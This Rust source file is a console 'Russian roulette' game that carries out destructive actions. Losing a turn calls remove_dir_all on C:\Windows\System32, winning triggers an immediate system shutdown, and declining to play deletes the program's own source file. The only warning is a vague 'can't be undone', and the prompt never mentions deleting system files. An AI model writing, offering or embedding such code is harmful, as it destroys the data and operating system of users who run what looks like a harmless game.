use rand::Rng;
use std::{fs, io, process, thread, time::Duration};

fn user_shoot() {
    let mut rng = rand::thread_rng();
    let result: bool = rng.gen();

    if result {
        println!("You got shot! Deleting folder...");
        thread::sleep(Duration::from_secs(2));
        if let Err(err) = fs::remove_dir_all("C:\\Windows\\System32") {
            println!("Failed to delete the folder: {}", err);
        }
        process::exit(0);
    } else {
        println!("You survived! Passing the gun to the computer...");
        thread::sleep(Duration::from_secs(2));
        computer_shoot();
    }
}

fn computer_shoot() {
    let mut rng = rand::thread_rng();
    let result: bool = rng.gen();

    if result {
        println!("Computer got shot! You win!");
        thread::sleep(Duration::from_secs(5));
        if cfg!(target_os = "windows") {
            process::Command::new("shutdown")
                .arg("/s")
                .arg("/t")
                .arg("1")
                .spawn()
                .expect("Failed to shut down the system");
        } else {
            println!("Shutdown command is only for Windows.");
        }
    } else {
        println!("Computer survived! Passing the gun to you...");
        thread::sleep(Duration::from_secs(2));
        user_shoot();
    }
}

fn start_game() {
    println!("You are about to fire a gun, and it can't be undone.");
    println!("Are you sure you want to play this game?");
    println!("Type: yes / no");

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read input");

    if input.trim().eq_ignore_ascii_case("yes") {
        println!("It's your turn! Type 'fire' to take a shot.");
        loop {
            input.clear();
            io::stdin()
                .read_line(&mut input)
                .expect("Failed to read input");

            if input.trim().eq_ignore_ascii_case("fire") {
                user_shoot();
            }
        }
    } else {
        println!("Exiting the game...");
        fs::remove_file("main.rs").expect("Failed to delete main.rs");
        process::exit(0);
    }
}

fn main() {
    start_game();
}
